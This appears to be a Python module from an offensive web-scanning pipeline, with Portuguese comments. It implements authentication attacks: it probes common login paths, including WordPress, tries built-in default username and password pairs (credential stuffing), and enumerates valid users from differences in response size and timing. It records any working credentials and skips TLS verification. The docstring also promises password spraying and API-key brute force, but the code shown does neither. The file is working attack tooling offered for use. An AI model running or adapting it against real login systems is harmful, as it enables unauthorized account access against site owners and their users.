"""
attack/auth_attacker.py — Pipeline 4: Ataques de autenticação.

Com base nos findings de rate limit ausente / endpoints de auth expostos:
  1. Credential Stuffing com lista curta de credenciais comuns
  2. Password Spray (uma senha por vez em múltiplos usuários)
  3. Enumeração de usuários via tempo de resposta / mensagem diferente
  4. Brute force de API Keys / Tokens nos headers
"""
import time
import requests
from core.utils import print_status


# ─── Wordlists compactas embutidas ────────────────────────────────────────────

TOP_USERS = [
    "admin", "administrator", "root", "user", "test", "guest",
    "demo", "superuser", "operator", "manager", "support",
    "info", "service", "api", "dev", "developer", "system",
]

TOP_PASSWORDS = [
    "password", "123456", "admin", "admin123", "password123",
    "12345678", "test", "qwerty", "letmein", "welcome",
    "monkey", "dragon", "master", "1234", "pass", "secret",
    "changeme", "root", "toor", "abc123", "iloveyou",
]

CREDENTIAL_PAIRS = [
    ("admin",         "admin"),
    ("admin",         "admin123"),
    ("admin",         "password"),
    ("administrator", "administrator"),
    ("root",          "root"),
    ("root",          "toor"),
    ("test",          "test"),
    ("guest",         "guest"),
    ("user",          "user"),
    ("demo",          "demo"),
    ("admin",         ""),
    ("",              ""),
]

AUTH_ENDPOINTS = [
    "/login", "/signin", "/auth", "/auth/login",
    "/api/auth", "/api/login", "/api/v1/auth",
    "/api/v1/login", "/api/v2/auth", "/api/v2/login",
    "/user/login", "/account/login", "/admin/login",
    "/wp-login.php", "/wp-admin",
]

SUCCESS_INDICATORS = [
    "token", "access_token", "jwt", "session",
    "dashboard", "welcome", "logout", "profile",
    "authenticated", "success", "200",
]

FAIL_INDICATORS = [
    "invalid", "incorrect", "wrong", "failed", "error",
    "unauthorized", "denied", "blocked", "invalid credentials",
]

USER_FIELD_NAMES  = ["username", "email", "user", "login", "name", "usr"]
PASS_FIELD_NAMES  = ["password", "pass", "passwd", "pwd", "secret"]


# ─── Classe ───────────────────────────────────────────────────────────────────

class AuthAttacker:
    def __init__(self, target: str, findings: list, context=None):
        self.target   = target
        self.findings = findings
        self.context  = context
        self.results  = {
            "valid_credentials": [],
            "user_enum":         [],
            "endpoints_tested":  [],
            "attack_log":        [],
        }

    def _post(self, url, data, headers=None) -> requests.Response | None:
        try:
            h = {"Content-Type": "application/json"}
            if headers:
                h.update(headers)
            # Tenta JSON primeiro
            import json
            r = requests.post(url, json=data, headers=h,
                              timeout=8, verify=False, allow_redirects=True)
            return r
        except Exception:
            try:
                return requests.post(url, data=data, timeout=8,
                                     verify=False, allow_redirects=True)
            except Exception:
                return None

    def _log(self, msg, level="INFO"):
        print_status(f"[Auth] {msg}", level)
        self.results["attack_log"].append(msg)

    def _is_success(self, r: requests.Response) -> bool:
        if not r:
            return False
        text = r.text.lower()
        # Checa código de status
        if r.status_code in (200, 302):
            hits_ok  = sum(1 for w in SUCCESS_INDICATORS if w in text)
            hits_bad = sum(1 for w in FAIL_INDICATORS   if w in text)
            return hits_ok > 0 and hits_bad == 0
        return False

    # ── Detecta campos de login ───────────────────────────────────────────────

    def _detect_fields(self, url: str):
        """Tenta detectar os nomes dos campos de user/pass via GET na página."""
        try:
            r = requests.get(url, timeout=6, verify=False)
            text = r.text.lower()
            user_field = next(
                (f for f in USER_FIELD_NAMES if f'name="{f}"' in text or f"name='{f}'" in text),
                "email"
            )
            pass_field = next(
                (f for f in PASS_FIELD_NAMES if f'name="{f}"' in text or f"name='{f}'" in text),
                "password"
            )
            return user_field, pass_field
        except Exception:
            return "email", "password"

    # ── 1. Credential Stuffing ────────────────────────────────────────────────

    def _credential_stuffing(self, url: str):
        self._log(f"Credential stuffing em {url}...", "INFO")
        user_field, pass_field = self._detect_fields(url)
        self.results["endpoints_tested"].append(url)

        for user, passwd in CREDENTIAL_PAIRS:
            data = {user_field: user, pass_field: passwd}
            r = self._post(url, data)
            if self._is_success(r):
                self._log(f"CREDENCIAL VÁLIDA: {user}:{passwd} em {url}", "CRIT")
                self.results["valid_credentials"].append({
                    "url":      url,
                    "username": user,
                    "password": passwd,
                    "status":   r.status_code if r else 0,
                    "severity": "CRITICAL",
                })
                return True
            # Rate limiting gentil
            time.sleep(0.2)
        return False

    # ── 2. User Enumeration via delta de resposta ─────────────────────────────

    def _enum_users(self, url: str):
        self._log(f"Enumerando usuários em {url}...", "INFO")
        user_field, pass_field = self._detect_fields(url)
        baseline_data = {user_field: "nonexistent_user_xyz9876", pass_field: "wrong_pass"}
        r_baseline = self._post(url, baseline_data)
        if not r_baseline:
            return

        baseline_len = len(r_baseline.text)
        baseline_t   = r_baseline.elapsed.total_seconds()

        for user in TOP_USERS:
            data = {user_field: user, pass_field: "wrong_pass_xyz"}
            r = self._post(url, data)
            if not r:
                continue

            # Diferença de tamanho ou tempo de resposta sugere usuário válido
            len_diff  = abs(len(r.text) - baseline_len)
            time_diff = abs(r.elapsed.total_seconds() - baseline_t)

            if len_diff > 50 or time_diff > 1.0:
                self._log(f"Possível usuário válido: '{user}' "
                          f"(Δlen={len_diff}, Δt={time_diff:.2f}s)", "WARN")
                self.results["user_enum"].append({
                    "url":      url,
                    "username": user,
                    "len_diff": len_diff,
                    "time_diff": round(time_diff, 2),
                })
            time.sleep(0.15)

    # ── 3. Descobre endpoints de auth válidos ─────────────────────────────────

    def _discover_auth_endpoints(self) -> list:
        found = []
        for path in AUTH_ENDPOINTS:
            url = self.target.rstrip("/") + path
            try:
                r = requests.get(url, timeout=5, verify=False)
                if r and r.status_code not in (404, 410):
                    found.append(url)
                    self._log(f"Endpoint de auth ativo: {url} [{r.status_code}]", "INFO")
            except Exception:
                pass
        return found

    # ── Run ───────────────────────────────────────────────────────────────────

    def run(self) -> dict:
        # Coleta endpoints dos findings (rate limit ausente)
        rate_findings = [
            f for f in self.findings
            if "rate limit" in (f.get("issue","") + f.get("type","")).lower()
        ]

        # Endpoints encontrados nos findings
        finding_urls = list({f.get("url","") for f in rate_findings if f.get("url")})

        # Descobre endpoints de auth adicionais
        discovered = self._discover_auth_endpoints()

        all_endpoints = list(dict.fromkeys(finding_urls + discovered))[:6]

        if not all_endpoints:
            self._log("Nenhum endpoint de auth identificado.", "WARN")
            return self.results

        self._log(f"{len(all_endpoints)} endpoint(s) de autenticação para atacar.", "CRIT")

        for url in all_endpoints:
            self._credential_stuffing(url)
            self._enum_users(url)

        return self.results
